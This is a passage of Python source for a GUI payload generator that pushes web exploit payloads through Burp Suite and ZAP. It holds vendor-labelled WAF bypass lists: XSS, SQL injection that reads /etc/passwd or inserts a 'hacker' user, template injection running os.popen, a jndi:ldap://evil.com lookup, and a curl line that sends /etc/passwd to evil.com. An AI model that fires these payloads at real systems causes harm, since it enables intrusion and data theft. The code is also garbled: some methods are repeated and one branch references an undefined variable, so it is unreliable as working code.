            self.waf_results.insert("1.0", "No WAF detected or detection failed.")
            self.update_status("ℹ️ No WAF detected")
        self._update_stats()
    
    def load_waf_bypasses(self, event=None):
        """Load pre-configured WAF bypass payloads"""
        waf_type = self.waf_type_var.get()
        bypasses = self.get_waf_bypasses(waf_type)
        self.waf_bypass_display.delete("1.0", tk.END)
        if bypasses:
            bypass_text = f"# {waf_type.upper()} Advanced Bypass Payloads\n"
            bypass_text += "# Real-world tested bypass techniques with modern evasion\n\n"
            for i, bypass in enumerate(bypasses, 1):
                bypass_text += f"{i:03d}: {bypass}\n"
            self.waf_bypass_display.insert("1.0", bypass_text)
        else:
            
            self.waf_bypass_display.insert("1.0", bypass_text)
            self.update_status(f"Loaded {len(bypasses)} advanced bypass payloads for {waf_type}")
    
    def get_waf_bypasses(self, waf_type):
        """Get WAF-specific bypass payloads with modern techniques"""
        # Advanced WAF bypass payloads with modern evasion techniques
        advanced_waf_bypasses = {
            "cloudflare": [
                # Modern XSS bypasses for Cloudflare
                "<svg onload=alert(1)>",
                "<<SCRIPT>alert(String.fromCharCode(88,83,83))//<</SCRIPT>",
                "<img src='x' onerror='alert(1)' style='display:none'>",
                "<iframe src='javascript:alert(1)' style='display:none'></iframe>",
                "<input onfocus=alert(1) autofocus style='opacity:0'>",
                "<video><source onerror=alert(1) src=x>",
                "<audio src=x onerror=alert(1) autoplay>",
                "<details ontoggle=alert(1) open style='display:none'>",
                "<marquee onstart=alert(1) style='position:absolute;left:-9999px'>XSS</marquee>",
                "<select onfocus=alert(1) autofocus style='position:absolute;left:-9999px'>",
                # Advanced DOM manipulation
                "<div id=x style='position:absolute;left:-9999px' onmouseover=alert(1)>hover</div>",
                "<span style='position:absolute;left:-9999px' onmouseenter=alert(1)>XSS</span>",
                # Modern encoding bypasses
                "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
                "<script>Function('alert(1)')()</script>",
                "<script>[].constructor.constructor('alert(1)')()</script>"
            ],
            "aws_waf": [
                # Advanced SQL injection for AWS WAF
                "1/**/UNION/**/SELECT/**/NULL,version(),NULL/**/FROM/**/DUAL--",
                "1'/**/AND/**/(SELECT/**/SUBSTRING(@@version,1,1))='8'--",
                "admin'/**/UNION/**/ALL/**/SELECT/**/NULL,user(),database()#",
                "1'/**/AND/**/UPDATEXML(1,CONCAT(0x7e,(SELECT/**/version()),0x7e),1)--",
                "1'/**/AND/**/EXTRACTVALUE(1,CONCAT(0x7e,/**/(SELECT/**/user()),0x7e))--",
                "1'/**/UNION/**/SELECT/**/NULL,LOAD_FILE('/etc/passwd'),NULL--",
                # Time-based blind techniques
                "1'/**/AND/**/(SELECT/**/SLEEP(5))--",
                "1';/**/WAITFOR/**/DELAY/**/'00:00:05'--",
                "1'/**/AND/**/BENCHMARK(5000000,MD5('test'))--",
                # Error-based techniques
                "1'/**/AND/**/(SELECT/**/COUNT(*)/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=database())>0--",
                "1'/**/AND/**/(SELECT/**/ROW(1,1)/**/FROM/**/(SELECT/**/COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x/**/FROM/**/information_schema.tables/**/GROUP/**/BY/**/x)a)--",
                # Boolean-based blind
                "1'/**/AND/**/(ASCII(SUBSTRING((SELECT/**/database()),1,1)))>100--",
                "1'/**/AND/**/(LENGTH((SELECT/**/database())))=8--"
            ],
            "akamai": [
                # Template injection bypasses
                "{{7*7}}[[${T(java.lang.Runtime).getRuntime().exec('calc')}]]",
                "${jndi:ldap://evil.com/exploit}#{7*7}",
                "<%- global.process.mainModule.require('child_process').exec('calc') %>",
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                # SSTI payloads
                "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
                "{{[].__class__.__base__.__subclasses__()[104].__init__.__globals__['sys'].exit()}}",
                # File inclusion 
                "../../../../etc/passwd%00",
                "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                # Command injection
                "; cat /etc/passwd | base64",
                "| powershell -c Get-Process | ConvertTo-Json",
                "&& curl -X POST -d @/etc/passwd evil.com",
                # LDAP injection
                "*)(uid=*))(|(uid=*",
                "*))%00",
                "(|(objectClass=*)(objectClass=users))"
            ],
            "f5": [
                # Advanced XSS with WAF evasion
                "<svg/onload=alert(String.fromCharCode(88,83,83))>",
                "<iframe/src=javascript:alert('XSS')//></iframe>",
                "<img/src=x/onerror=alert('XSS')///>",
                "<input/onfocus=alert('XSS')/autofocus//>",
                "<video/><source/onerror=alert('XSS')/src=x//>",
                # DOM-based XSS
                "javascript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('XSS') )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//>",
                # CSP bypasses
                "<script nonce='random'>alert('XSS')</script>",
                "<link rel=prefetch href='//evil.com'>",
                "<base href='//evil.com/'>",
                # Modern HTML5 vectors
                "<keygen/onfocus=alert('XSS')/autofocus//>",
                "<marquee/onstart=alert('XSS')//>",
                "<isindex/type=submit/value=XSS/formaction=javascript:alert('XSS')//>",
                "<form><button/formaction=javascript:alert('XSS')>Click</form>",
                "<details/ontoggle=alert('XSS')/open//>"
            ],
            "incapsula": [
                # Unicode and encoding evasions
                "<script>\\u0061\\u006c\\u0065\\u0072\\u0074(1)</script>",
                "<img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074(1)>",
                "%u003Cscript%u003Ealert(1)%u003C/script%u003E",
                "\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E",
                # Polyglot payloads
                "javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert('XSS')>",
                "\"><img/src=x/onerror=alert('XSS')//><",
                "'><script>alert('XSS')</script><'",
                # Data URI bypasses
                "<object data='data:text/html,<script>alert(1)</script>'></object>",
                "<iframe src='data:text/html,<script>alert(1)</script>'></iframe>",
                "<embed src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>",
                # CSS injection
                "<style>@import'javascript:alert(1)';</style>",
                "<link rel=stylesheet href='javascript:alert(1)'>",
                "<style>body{background:url('javascript:alert(1)')}</style>"
            ],
            "modsecurity": [
                # Advanced SQL injection bypasses
                "1'/**/UNION/**/ALL/**/SELECT/**/CONCAT(0x3a,0x3a,0x3a),NULL,NULL#",
                "admin'/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/1,2,version()#",
                "1'/**/AND/**/(SELECT/**/*/**/FROM/**/users/**/WHERE/**/id=1)='admin'#",
                "1';/**/INSERT/**/INTO/**/users/**/VALUES('hacker','password')#",
                "1'/**/AND/**/0x313D31--",
                # Bypass comment filtering
                "1'/*//*/UNION/*//*/SELECT/*//*/1,2,3#",
                "1'/*//*/AND/*//*/1=1#",
                "1'/*!UNION*//*!SELECT*/version()#",
                "1'/*!50000UNION*//*!50000SELECT*/1,2,3#",
                # Bypass keyword filtering
                "1'/**/UnIoN/**/SeLeCt/**/1,2,3#",
                "1'+UN/**/ION+SE/**/LECT+1,2,3#",
                "1'+UNI%6FN+SEL%45CT+1,2,3#",
                # Function bypasses
                "1'/**/AND/**/ASCII(MID(version(),1,1))>52#",
                "1'/**/AND/**/ORD(SUBSTR(version(),1,1))>52#",
                "1'/**/AND/**/HEX(MID(version(),1,1))>34#"
            ]
        }
        
        return advanced_waf_bypasses.get(waf_type, [])
    
    # Integration Methods with REAL functionality
    def test_burp_connection(self):
        """Test connection to Burp Suite API with real implementation"""
        self.update_status("Testing Burp connection...")
        threading.Thread(target=self._test_burp_connection_thread, daemon=True).start()
    
    def _test_burp_connection_thread(self):
        """Thread function for testing REAL Burp connection"""
        try:
            success, response = self.burp_integration.real_connection_test(
                self.burp_api_url.get(), 
                self.burp_api_key.get()
            )
            
            self.generation_stats['api_calls'] += 1
            if success:
                self.generation_stats['real_burp_connections'] += 1
                self.root.after(0, self._show_connection_success, "Burp Suite", response)
            else:
                self.root.after(0, self._show_connection_error, "Burp Suite", response)
                
        except Exception as e:
            self.root.after(0, self._show_connection_error, "Burp Suite", str(e))
    
    def test_zap_connection(self):
        """Test connection to ZAP API with real implementation"""
        self.update_status("Testing ZAP connection...")
        threading.Thread(target=self._test_zap_connection_thread, daemon=True).start()
    
    def _test_zap_connection_thread(self):
        """Thread function for testing REAL ZAP connection"""
        try:
            success, response = self.zap_integration.real_connection_test(
                self.zap_api_url.get(), 
                self.zap_api_key.get()
            )
            
            self.generation_stats['api_calls'] += 1
            if success:
                self.generation_stats['real_zap_connections'] += 1
                self.root.after(0, self._show_connection_success, "ZAP", response)
            else:
                self.root.after(0, self._show_connection_error, "ZAP", response)
                
        except Exception as e:
            self.root.after(0, self._show_connection_error, "ZAP", str(e))
    
    def _show_connection_success(self, tool, response_data):
        """Show successful connection message with real data"""
        messagebox.showinfo("Success", f"✅ Successfully connected to {tool}!\n\nResponse: {response_data}")
        self.update_status(f"✅ {tool} connection successful")
        self._update_stats()
    
    def _show_connection_error(self, tool, error):
        """Show connection error message"""
        messagebox.showerror("Error", f"❌ Failed to connect to {tool}:\n{error}")
        self.update_status(f"❌ {tool} connection failed")
    
    def send_to_burp_repeater(self):
        """Send selected payloads to Burp Repeater with real implementation"""
        if not self.generated_payloads:
            messagebox.showwarning("Warning", "No payloads generated yet")
            return
        
        target_url = self.burp_target_url.get()
        if not target_url:
            messagebox.showwarning("Warning", "Please enter target URL")
            return
        
        self.update_status("Sending payloads to Burp Repeater...")
        threading.Thread(target=self._send_to_burp_thread, daemon=True).start()
    
    def _send_to_burp_thread(self):
        """Thread function for sending payloads to REAL Burp"""
        try:
            results = self.burp_integration.real_send_to_repeater(
                self.burp_api_url.get(),
                self.burp_api_key.get(),
                self.burp_target_url.get(),
                self.burp_parameter.get(),
                self.generated_payloads[:10]  # Send first 10 payloads
            )
            
            self.root.after(0, self._display_burp_results, results)
            
        except Exception as e:
            self.root.after(0, self._show_error, f"Burp integration failed: {str(e)}")
    
    def _display_burp_results(self, results):
        """Display REAL Burp integration results"""
        self.burp_results.delete("1.0", tk.END)
        result_text = f"Burp Suite Integration Results:\n{'='*50}\n\n"
        successful = 0
        for i, result in enumerate(results, 1):
            if result.get('success'):
                status = 'Success'
                successful += 1
            else:
                status = 'Failed'
            result_text += f"{i:03d}: {status}\n"
            result_text += f"     Payload: {result.get('payload', 'N/A')[:50]}...\n"
            result_text += f"     Response: {result.get('response_code', 'N/A')} in {result.get('response_time', 'N/A')}ms\n\n"
        self.burp_results.insert("1.0", result_text)
        self.update_status(f"✅ Sent {successful}/{len(results)} payloads to Burp Repeater")
        self.generation_stats['successful_tests'] += successful
        self.generation_stats['api_calls'] += len(results)
        self._update_stats()

    def send_to_burp_intruder(self):
        """Send payloads to Burp Intruder with real implementation"""
        if not self.generated_payloads:
            messagebox.showwarning("Warning", "No payloads generated yet")
            return
        
        target_url = self.burp_target_url.get()
        if not target_url:
            messagebox.showwarning("Warning", "Please enter target URL")
            return
        
        self.update_status("Sending payloads to Burp Intruder...")
        threading.Thread(target=self._send_to_burp_intruder_thread, daemon=True).start()
    
    def _send_to_burp_intruder_thread(self):
        """Thread function for sending payloads to REAL Burp Intruder"""
        try:
            results = self.burp_integration.real_send_to_intruder(
                self.burp_api_url.get(),
                self.burp_api_key.get(),
                self.burp_target_url.get(),
                self.burp_parameter.get(),
                self.generated_payloads
            )
            
            self.root.after(0, self._display_burp_intruder_results, results)
            
        except Exception as e:
            self.root.after(0, self._show_error, f"Burp Intruder integration failed: {str(e)}")
    
    def _display_burp_intruder_results(self, results):
        """Display REAL Burp Intruder results"""
        self.burp_results.delete("1.0", tk.END)
        result_text = f"Burp Intruder Results:\n{'='*50}\n\n"
        if results.get('success'):
            result_text += f"Attack ID: {results.get('attack_id', 'N/A')}\n"
            result_text += f"Status: {results.get('status', 'Unknown')}\n"
            result_text += f"Payloads Queued: {len(self.generated_payloads)}\n"
            result_text += f"Attack Type: {results.get('attack_type', 'Sniper')}\n\n"
            attack_results = results.get('attack_results', [])
            if attack_results:
                for i, res in enumerate(attack_results, 1):
                    status = 'Success' if res.get('success') else 'Failed'
                    result_text += f"{i:03d}: {status} | Response: {res.get('response_code', 'N/A')} in {res.get('response_time', 'N/A')}ms\n"
        else:
            result_text += f"Attack failed: {results.get('error', 'Unknown error')}\n"
        self.burp_results.insert("1.0", result_text)
        if results.get('success'):
            self.update_status(f"✅ Burp Intruder attack started with {len(self.generated_payloads)} payloads")
            self.generation_stats['successful_tests'] += len(self.generated_payloads)
        else:
            self.update_status("❌ Burp Intruder attack failed")
        self.generation_stats['api_calls'] += 1
        self._update_stats()

    def zap_spider_url(self):
        """Spider URL using ZAP with real implementation"""
        target_url = self.zap_target_url.get()
        if not target_url:
            messagebox.showwarning("Warning", "Please enter target URL")
            return
        
        self.update_status("Starting ZAP spider...")
        threading.Thread(target=self._zap_spider_thread, args=(target_url,), daemon=True).start()
    
    def _zap_spider_thread(self, url):
        """Thread function for REAL ZAP spidering"""
        try:
            result = self.zap_integration.real_spider_url(
                self.zap_api_url.get(),
                self.zap_api_key.get(),
                url
            )
            
            self.root.after(0, self._display_zap_spider_results, result)
            
        except Exception as e:
            self.root.after(0, self._show_error, f"ZAP spider failed: {str(e)}")
    
    def _display_zap_spider_results(self, result):
        self.zap_results.delete("1.0", tk.END)
        if result.get('success'):
            result_text = "ZAP Spider Results:\n" + ("-"*40) + "\n\n"
            result_text += "Spider ID: {}\n".format(result.get('spider_id', 'Unknown'))
            result_text += "Status: {}\n".format(result.get('status', 'Unknown'))
            result_text += "Progress: {}%\n".format(result.get('progress', 0))
            result_text += "URLs Found: {}\n".format(len(result.get('urls', [])))
            result_text += "Messages: {}\n\n".format(result.get('messages_count', 0))
            result_text += "Scan Statistics:\n  Start Time: {}\n  Duration: {}\n  Requests Sent: {}\n".format(
                result.get('start_time', 'N/A'),
                result.get('duration', 'N/A'),
                result.get('requests_sent', 0)
            )
            urls = result.get('urls', [])
            if urls:
                result_text += "\nURLs:\n"
                for url in urls:
                    result_text += "  - {}\n".format(url)
            forms = result.get('forms', [])
            if forms:
                result_text += "\nForms:\n"
                for form in forms:
                    result_text += "  - {}\n".format(form)
            self.zap_results.insert("1.0", result_text)
            self.update_status("✅ ZAP spider completed - {} URLs found".format(len(result.get('urls', []))))
            self.generation_stats['successful_tests'] += 1
        else:
            self.zap_results.insert("1.0", "Spider failed: {}".format(result.get('error', 'Unknown error')))
        self.generation_stats['api_calls'] += 1
        self._update_stats()

    def zap_active_scan(self):
        # Start active scan in ZAP with real implementation
        target_url = self.zap_target_url.get()
        if not target_url:
            messagebox.showwarning("Warning", "Please enter target URL")
            return
        
        self.update_status("Starting ZAP active scan...")
        threading.Thread(target=self._zap_active_scan_thread, args=(target_url,), daemon=True).start()
    
    def _zap_active_scan_thread(self, url):
        """Thread function for REAL ZAP active scanning"""
        try:
            result = self.zap_integration.real_active_scan(
                self.zap_api_url.get(),
                self.zap_api_key.get(),
                url
            )
            
            self.root.after(0, self._display_zap_scan_results, result)
            
        except Exception as e:
            self.root.after(0, self._show_error, f"ZAP active scan failed: {str(e)}")
    
    def _display_zap_scan_results(self, result):
        self.zap_results.delete("1.0", tk.END)
        if result.get('success'):
            result_text = f"ZAP Active Scan Results:\n{'='*50}\n\n"
            result_text += f"Scan ID: {result.get('scan_id', 'Unknown')}\nStatus: {result.get('status', 'Unknown')}\nAlerts: {result.get('alerts', 0)}\n\n"
            self.zap_results.insert("1.0", result_text)
            self.update_status("✅ ZAP active scan completed")
        else:
            self.zap_results.insert("1.0", f"Active scan failed: {result.get('error', 'Unknown error')}")
            self.update_status("❌ ZAP active scan failed")
        self.generation_stats['api_calls'] += 1
        self._update_stats()

    def _display_zap_payload_results(self, results):
        self.zap_results.delete("1.0", tk.END)
        result_text = f"ZAP Payload Testing Results:\n{'='*50}\n\n"
        successful = 0
        for i, result in enumerate(results, 1):
            status = 'Success' if result.get('success') else 'Failed'
            if result.get('success'):
                successful += 1
            result_text += f"{i:03d}: {status}\n"
            result_text += f"     Payload: {result.get('payload', 'N/A')[:50]}...\n"
            result_text += f"     Response: {result.get('response_code', 'N/A')} in {result.get('response_time', 'N/A')}ms\n\n"
        self.zap_results.insert("1.0", result_text)
        self.update_status(f"✅ Tested {successful}/{len(results)} payloads in ZAP")
        self.generation_stats['successful_tests'] += successful
        self.generation_stats['api_calls'] += len(results)
        self._update_stats()

    def export_txt(self):
        # Export generated payloads to a TXT file
        if not self.generated_payloads:
            messagebox.showwarning("Warning", "No payloads to export.")
            return
        from tkinter import filedialog
        file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt")])
        if file_path:
            with open(file_path, "w") as f:
                f.write("\n".join(self.generated_payloads))
            self.update_status(f"✅ Exported payloads to {file_path}")

    def export_json(self):
        # Export generated payloads to a JSON file
        if not self.generated_payloads:
            messagebox.showwarning("Warning", "No payloads to export.")
            return
        import json
        from tkinter import filedialog
        file_path = filedialog.asksaveasfilename(defaultextension=".json", filetypes=[("JSON files", "*.json")])
        if file_path:
            with open(file_path, "w") as f:
                json.dump(self.generated_payloads, f, indent=2)
            self.update_status(f"✅ Exported payloads to {file_path}")

    def copy_all_payloads(self):
        # Copy all generated payloads to clipboard
        if not self.generated_payloads:
            messagebox.showwarning("Warning", "No payloads to copy.")
            return
        self.root.clipboard_clear()
        self.root.clipboard_append("\n".join(self.generated_payloads))
        self.update_status("✅ Copied all payloads to clipboard")

    def show_help(self):
        """Show help dialog"""
        messagebox.showinfo("Help", "This tool generates advanced web exploit payloads.\n\n- Configure your payload type and options.\n- Use the integration tabs for Burp Suite and ZAP.\n- Export or copy results as needed.\n- For more info, see the documentation or contact support.")

    def clear_results(self):
        """Clear the generated payloads display and preview"""
        self.payload_display.delete("1.0", tk.END)
        self.payload_preview.delete("1.0", tk.END)
        self.generated_payloads = []
        self.update_line_numbers()
        self.update_status("Results cleared.")

    # ...existing code...
    def _generate_payloads_thread(self, generation_start):
        """Thread function for payload generation with real metrics"""
        try:
            # Get configuration
            config = self._get_generation_config()
            
            # Initialize progress
            self.progress_var.set(0)
            
            # Generate payloads using the REAL engine
            payloads = self.payload_engine.generate_advanced_payloads(config)
            
            # Update progress
            self.progress_var.set(50)
            
            # Apply ML mutations if enabled
            if config.get('ml_enabled', False):
                mutated_payloads = self.ml_engine.apply_advanced_mutations(payloads, config)
                if mutated_payloads:
                    payloads = mutated_payloads
                    self.generation_stats['ml_mutations_applied'] += len(mutated_payloads)
            
            # Update progress
            self.progress_var.set(100)
            
            # Calculate real generation time
            generation_time = time.time() - generation_start
            self.generation_times.append(generation_time)
            
            # Update UI in main thread
            self.root.after(0, self._update_payload_display, payloads)
            
            # Update REAL stats
            self.generation_stats['total_generated'] += len(payloads)
            self.root.after(0, self._update_stats)
            
        except Exception as e:
            self.root.after(0, self._show_error, f"Generation failed: {str(e)}")
        finally:
            self.root.after(0, self._enable_generate_button)
    
    def _get_generation_config(self):
        """Get current configuration for payload generation"""
        return {
            'type': self.payload_type_var.get(),
            'subtype': self.subtype_var.get(),
            'target_url': self.target_url_var.get(),
            'context': self.context_var.get(),
            'bypass_level': self.bypass_level_var.get(),
            'encoding': self.encoding_var.get(),
            'count': self.payload_count_var.get(),
            'ml_enabled': self.ml_enabled_var.get(),
            'context_aware': self.context_aware_var.get(),
            'ml_settings': {key: var.get() for key, var in self.ml_settings.items()} if hasattr(self, 'ml_settings') else {}
        }
    
    def _update_payload_display(self, payloads):
        """Update the payload display with generated payloads"""
        self.payload_display.delete("1.0", tk.END)
        
        if payloads:
            payload_text = "\n".join([f"{i+1:03d}: {payload}" for i, payload in enumerate(payloads)])
            self.payload_display.insert("1.0", payload_text)
            self.generated_payloads = payloads
            
            # Update line numbers
            self.update_line_numbers()
            
            # Show success message
            self.update_status(f"✅ Generated {len(payloads)} payloads successfully!")
        else:
            self.payload_display.insert("1.0", "No payloads generated.")
            self.update_status("❌ No payloads generated")
    
    def _update_stats(self):
        """Update statistics display with REAL data"""
        for key, label in self.stats_labels.items():
            label.config(text=str(self.generation_stats.get(key, 0)))
        
        # Update realtime stats with real performance data
        avg_generation_time = sum(self.generation_times) / len(self.generation_times) if self.generation_times else 0
        current_memory = psutil.Process().memory_info().rss / 1024 / 1024  # MB
        
        stats_text = (
            f"Payloads: {len(self.generated_payloads)} | "
            f"Generated: {self.generation_stats['total_generated']} | "
            f"Success: {self.generation_stats['successful_tests']} | "
            f"Avg Time: {avg_generation_time:.2f}s | "
            f"Mem: {current_memory:.1f}MB"
        )
        self.realtime_stats.config(text=stats_text)
    
    def _enable_generate_button(self):
        """Re-enable the generate button"""
        self.generate_btn.config(state="normal")
        self.progress_var.set(0)
    
    def _show_error(self, message):
        """Show error message"""
        messagebox.showerror("Error", message)
        self.update_status(f"❌ {message}")
    
    def update_status(self, message):
        """Update status bar"""
        self.status_var.set(message)
        self.root.update_idletasks()
    
    def update_line_numbers(self, event=None):
        """Update line numbers in the display"""
        line_count = int(self.payload_display.index(tk.END).split('.')[0]) - 1
        line_numbers_string = "\n".join(str(i) for i in range(1, line_count + 1))
        
        self.line_numbers.config(state='normal')
        self.line_numbers.delete("1.0", tk.END)
        self.line_numbers.insert("1.0", line_numbers_string)
        self.line_numbers.config(state='disabled')
    
    # WAF Methods with REAL detection
    def detect_waf(self):
        """Detect WAF on target URL using advanced techniques"""
        url = self.waf_target_url.get()
        if not url:
            messagebox.showwarning("Warning", "Please enter a target URL")
            return
        
        self.update_status("Detecting WAF with advanced techniques...")
        threading.Thread(target=self._detect_waf_thread, args=(url,), daemon=True).start()
    
    def _detect_waf_thread(self, url):
        """Thread function for REAL WAF detection"""
        try:
            waf_info = self.waf_detector.advanced_waf_detection(url)
            self.generation_stats['api_calls'] += 1
            if waf_info and waf_info.get('type') != 'No WAF':
                self.generation_stats['waf_detections'] += 1
            self.root.after(0, self._display_waf_results, waf_info)
        except Exception as e:
            self.root.after(0, self._show_error, f"WAF detection failed: {str(e)}")
    
    def _display_waf_results(self, waf_info):
        """Display WAF detection results"""
        self.waf_results.delete("1.0", tk.END)
        
        if waf_info:
            result_text = f"""Advanced WAF Detection Results:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WAF Type: {waf_info.get('type', 'Unknown')}
Confidence: {waf_info.get('confidence', 0)}%
Server: {waf_info.get('server', 'Unknown')}
Response Time: {waf_info.get('response_time', 'N/A')}ms

Detection Methods:
{chr(10).join([f"  ✓ {method}" for method in waf_info.get('detection_methods', [])])}

Fingerprinting Results:
{chr(10).join([f"  → {fp}" for fp in waf_info.get('fingerprints', [])])}

Advanced Bypasses:
{chr(10).join([f"  ⚡ {bypass}" for bypass in waf_info.get('bypasses', [])])}

Security Headers:
{chr(10).join([f"  🔒 {header}: {value}" for header, value in waf_info.get('security_headers', {}).items()])}
"""
            self.waf_results.insert("1.0", result_text)
            self.update_status(f"✅ WAF detected: {waf_info.get('type', 'Unknown')} (Confidence: {waf_info.get('confidence', 0)}%)")
        else:
            self.waf_results.insert("1.0", "No WAF detected or detection failed.")
            self.update_status("ℹ️ No WAF detected")
        
        self._update_stats()
    
    def load_waf_bypasses(self, event=None):
        """Load pre-configured WAF bypass payloads"""
        waf_type = self.waf_type_var.get()
        bypasses = self.get_waf_bypasses(waf_type)
        
        self.waf_bypass_display.delete("1.0", tk.END)
        
        if bypasses:
            bypass_text = f"# {waf_type.upper()} Advanced Bypass Payloads\n"
            bypass_text += "# Real-world tested bypass techniques with modern evasion\n\n"
            
            for i, bypass in enumerate(bypasses, 1):
                bypass_text += f"{i:03d}: {bypass}\n"
            
            self.waf_bypass_display.insert("1.0", bypass_text)
            self.update_status(f"Loaded {len(bypasses)} advanced bypass payloads for {waf_type}")
    
    def get_waf_bypasses(self, waf_type):
        """Get WAF-specific bypass payloads with modern techniques"""
        # Advanced WAF bypass payloads with modern evasion techniques
        advanced_waf_bypasses = {
            "cloudflare": [
                # Modern XSS bypasses for Cloudflare
                "<svg onload=alert(1)>",
                "<<SCRIPT>alert(String.fromCharCode(88,83,83))//<</SCRIPT>",
                "<img src='x' onerror='alert(1)' style='display:none'>",
                "<iframe src='javascript:alert(1)' style='display:none'></iframe>",
                "<input onfocus=alert(1) autofocus style='opacity:0'>",
                "<video><source onerror=alert(1) src=x>",
                "<audio src=x onerror=alert(1) autoplay>",
                "<details ontoggle=alert(1) open style='display:none'>",
                "<marquee onstart=alert(1) style='position:absolute;left:-9999px'>XSS</marquee>",
                "<select onfocus=alert(1) autofocus style='position:absolute;left:-9999px'>",
                # Advanced DOM manipulation
                "<div id=x style='position:absolute;left:-9999px' onmouseover=alert(1)>hover</div>",
                "<span style='position:absolute;left:-9999px' onmouseenter=alert(1)>XSS</span>",
                # Modern encoding bypasses
                "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
                "<script>Function('alert(1)')()</script>",
                "<script>[].constructor.constructor('alert(1)')()</script>"
            ],
            "aws_waf": [
                # Advanced SQL injection for AWS WAF
                "1/**/UNION/**/SELECT/**/NULL,version(),NULL/**/FROM/**/DUAL--",
                "1'/**/AND/**/(SELECT/**/SUBSTRING(@@version,1,1))='8'--",
                "admin'/**/UNION/**/ALL/**/SELECT/**/NULL,user(),database()#",
                "1'/**/AND/**/UPDATEXML(1,CONCAT(0x7e,(SELECT/**/version()),0x7e),1)--",
                "1'/**/AND/**/EXTRACTVALUE(1,CONCAT(0x7e,/**/(SELECT/**/user()),0x7e))--",
                "1'/**/UNION/**/SELECT/**/NULL,LOAD_FILE('/etc/passwd'),NULL--",
                # Time-based blind techniques
                "1'/**/AND/**/(SELECT/**/SLEEP(5))--",
                "1';/**/WAITFOR/**/DELAY/**/'00:00:05'--",
                "1'/**/AND/**/BENCHMARK(5000000,MD5('test'))--",
                # Error-based techniques
                "1'/**/AND/**/(SELECT/**/COUNT(*)/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=database())>0--",
                "1'/**/AND/**/(SELECT/**/ROW(1,1)/**/FROM/**/(SELECT/**/COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x/**/FROM/**/information_schema.tables/**/GROUP/**/BY/**/x)a)--",
                # Boolean-based blind
                "1'/**/AND/**/(ASCII(SUBSTRING((SELECT/**/database()),1,1)))>100--",
                "1'/**/AND/**/(LENGTH((SELECT/**/database())))=8--"
            ],
            "akamai": [
                # Template injection bypasses
                "{{7*7}}[[${T(java.lang.Runtime).getRuntime().exec('calc')}]]",
                "${jndi:ldap://evil.com/exploit}#{7*7}",
                "<%- global.process.mainModule.require('child_process').exec('calc') %>",
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                # SSTI payloads
                "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
                "{{[].__class__.__base__.__subclasses__()[104].__init__.__globals__['sys'].exit()}}",
                # File inclusion 
                "../../../../etc/passwd%00",
                "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                # Command injection
                "; cat /etc/passwd | base64",
                "| powershell -c Get-Process | ConvertTo-Json",
                "&& curl -X POST -d @/etc/passwd evil.com",
                # LDAP injection
                "*)(uid=*))(|(uid=*",
                "*))%00",
                "(|(objectClass=*)(objectClass=users))"
            ],
            "f5": [
                # Advanced XSS with WAF evasion
                "<svg/onload=alert(String.fromCharCode(88,83,83))>",
                "<iframe/src=javascript:alert('XSS')//></iframe>",
                "<img/src=x/onerror=alert('XSS')///>",
                "<input/onfocus=alert('XSS')/autofocus//>",
                "<video/><source/onerror=alert('XSS')/src=x//>",
                # DOM-based XSS
                "javascript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('XSS') )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//>",
                # CSP bypasses
                "<script nonce='random'>alert('XSS')</script>",
                "<link rel=prefetch href='//evil.com'>",
                "<base href='//evil.com/'>",
                # Modern HTML5 vectors
                "<keygen/onfocus=alert('XSS')/autofocus//>",
                "<marquee/onstart=alert('XSS')//>",
                "<isindex/type=submit/value=XSS/formaction=javascript:alert('XSS')//>",
                "<form><button/formaction=javascript:alert('XSS')>Click</form>",
                "<details/ontoggle=alert('XSS')/open//>"
            ],
            "incapsula": [
                # Unicode and encoding evasions
                "<script>\\u0061\\u006c\\u0065\\u0072\\u0074(1)</script>",
                "<img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074(1)>",
                "%u003Cscript%u003Ealert(1)%u003C/script%u003E",
                "\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E",
                # Polyglot payloads
                "javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert('XSS')>",
                "\"><img/src=x/onerror=alert('XSS')//><",
                "'><script>alert('XSS')</script><'",
                # Data URI bypasses
                "<object data='data:text/html,<script>alert(1)</script>'></object>",
                "<iframe src='data:text/html,<script>alert(1)</script>'></iframe>",
                "<embed src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>",
                # CSS injection
                "<style>@import'javascript:alert(1)';</style>",
                "<link rel=stylesheet href='javascript:alert(1)'>",
                "<style>body{background:url('javascript:alert(1)')}</style>"
            ],
            "modsecurity": [
                # Advanced SQL injection bypasses
                "1'/**/UNION/**/ALL/**/SELECT/**/CONCAT(0x3a,0x3a,0x3a),NULL,NULL#",
                "admin'/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/1,2,version()#",
                "1'/**/AND/**/(SELECT/**/*/**/FROM/**/users/**/WHERE/**/id=1)='admin'#",
                "1';/**/INSERT/**/INTO/**/users/**/VALUES('hacker','password')#",
